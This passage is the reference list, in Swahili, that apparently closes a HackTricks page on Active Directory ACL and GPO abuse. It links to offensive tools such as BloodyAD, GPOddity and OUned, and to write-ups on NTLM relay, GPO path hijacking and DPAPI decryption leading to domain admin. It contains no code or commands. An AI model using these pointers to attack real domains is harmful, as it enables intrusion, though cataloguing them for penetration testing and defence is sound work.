- [8] [BloodyAD – Operesheni za AD attribute/UAC kutoka Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (group membership)](https://www.samba.org/)
- [10] [HTB Puppy: Kutumia vibaya AD ACL, kuvunja Argon2 ya KeePassXC, na kusimbua DPAPI hadi DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Kuteka Nyara Njia za GPO UNC kwa Utekelezaji wa Code na NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: kutumia vibaya Active Directory GPO kupitia NTLM relaying, na mengineyo](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU inafanya mzaha? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: kutumia vibaya njia fiche za mashambulizi ya Organizational Units ACL katika Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Kuiga huduma halali za Active Directory kwenye mtandao: kisa cha GPO exploitation](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
